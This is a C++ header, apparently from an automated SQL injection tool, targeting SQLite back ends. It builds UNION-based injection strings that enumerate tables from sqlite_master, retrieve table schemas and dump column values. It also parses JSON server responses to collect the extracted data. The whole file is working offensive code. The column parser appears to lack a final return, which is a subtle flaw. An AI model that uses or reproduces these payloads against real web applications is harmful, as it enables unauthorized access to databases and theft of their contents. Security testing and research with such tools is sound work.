#ifndef SQLI_SQLITE
#define SQLI_SQLITE

#include "sqli_mysql.hpp"

struct sqli_sqlite
{
        inline static const str_vector _excluded = {
            "sqlite_sequence",
        };

        // =========================================== UNION BASED PAYLOADS
        static std::string union_based_tab_payload(const sptr_vector params)
        {
                const std::string offset = *params[0];
                *params[0] += "null, ";
                return "' UNION SELECT " + offset + "name " +
                       "FROM sqlite_master-- ";
        };

        static std::string union_based_col_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[1] + "sql " +
                       "FROM sqlite_master " +
                       "WHERE type='table' " +
                       "AND name='" + *params[0] + "'-- ";
        };

        static std::string union_based_val_payload(
            const sptr_vector params)
        {
                return "' UNION SELECT " + *params[2] + *params[1] + " " +
                       "FROM " + *params[0] + "-- ";
        };

        // =========================================== UNION BASED PARSER
        static str_vector union_based_parser(const std::string& response)
        {
                str_vector values;
                Json::Value entries;
                std::string errors;
                Json::CharReaderBuilder builder;
                std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
                if (!reader->parse(
                        response.c_str(),
                        response.c_str() + response.size(),
                        &entries, &errors))
                {
                        std::cerr << "[ ERROR ] Could not parse server response."
                                  << std::endl;
                        return values;
                }
                for (const auto& member : entries.getMemberNames())
                {
                        if (!entries[member].isArray())
                                continue;
                        if (entries[member].empty())
                                values.push_back(std::string());

                        for (const auto& array : entries[member])
                        {
                                if (!(array.isArray() && !array.empty()))
                                        continue;
                                values.push_back(
                                    array[array.size() - 1].asString());
                        }
                }
                return values;
        };

        static str_vector union_based_column_parser(const std::string& response)
        {
                str_vector values;
                Json::Value entries;
                std::string errors;
                Json::CharReaderBuilder builder;
                std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
                if (!reader->parse(
                        response.c_str(),
                        response.c_str() + response.size(),
                        &entries,
                        &errors))
                {
                        std::cerr << "[ ERROR ] Could not parse server response."
                                  << std::endl;
                        return values;
                }
                std::string schema;
                size_t start;
                size_t end;
                std::string str;
                std::stringstream ss;
                std::string token;
                for (const auto& member : entries.getMemberNames())
                {
                        if (!entries[member].isArray())
                                continue;
                        if (entries[member].empty())
                        {
                                values.push_back(std::string());
                                continue;
                        }
                        for (const auto& array : entries[member])
                        {
                                if (!(array.isArray() && !array.empty()))
                                        continue;
                                try
                                {
                                        schema = array[array.size() - 1].asString();
                                        break;
                                }
                                catch (const std::exception& e)
                                {
                                        return values;
                                }
                        }
                        start = schema.find('(');
                        end = schema.find(')');
                        if (start == std::string::npos || end == std::string::npos)
                                return values;

                        str = schema.substr(start + 1, end - start - 1);
                        ss.str(str);
                        token.clear();
                        while (std::getline(ss, token, ','))
                        {
                                token.erase(
                                    token.begin(),
                                    std::find_if(
                                        token.begin(),
                                        token.end(),
                                        [](unsigned char ch)
                                        { return !std::isspace(ch); }));
                                token.erase(
                                    std::find_if(
                                        token.rbegin(),
                                        token.rend(),
                                        [](unsigned char ch)
                                        { return !std::isspace(ch); })
                                        .base(),
                                    token.end());

                                size_t delimiter = token.find(' ');
                                if (delimiter != std::string::npos)
                                {
                                        std::string name = token.substr(
                                            0, delimiter);
                                        values.push_back(name);
                                }
                        }
                        return values;
                };
        }
};
#endif
